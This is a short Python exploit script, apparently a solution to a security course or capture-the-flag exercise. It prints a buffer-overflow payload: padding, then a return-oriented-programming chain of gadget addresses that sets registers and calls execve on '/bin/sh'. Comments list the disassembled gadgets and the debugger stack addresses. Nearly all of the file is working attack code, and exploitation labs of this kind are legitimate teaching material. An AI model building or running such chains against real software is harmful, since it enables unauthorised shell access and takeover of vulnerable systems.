#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(104*b"\x61" + pack("<II", 0x805c363, 0xfffef63c) + 2*pack("<I", 0x61616161) + 11*(pack("<I", 0x805e5cc) + 4*b"\x61") + 
                        pack("<I", 0x806e211) + b"/bin/sh")

#  805c363:	31 d2                	xor    %edx,%edx
#  805c365:	5b                   	pop    %ebx
#  805c366:	89 d0                	mov    %edx,%eax
#  805c368:	5e                   	pop    %esi
#  805c369:	5f                   	pop    %edi
#  805c36a:	c3                   	ret  
# eax = 0, ebx = --, edx = 0

#  805e5cc:	40                   	inc    %eax
#  805e5cd:	5f                   	pop    %edi
#  805e5ce:	c3                   	ret
# eax += 1

#  806e211:	31 c9                	xor    %ecx,%ecx
#  806e213:	cd 80                	int    $0x80
# ecx = 0, execve

# b *0x080488bc
# esp            0xfffef568
# ebp            0xfffef5cc
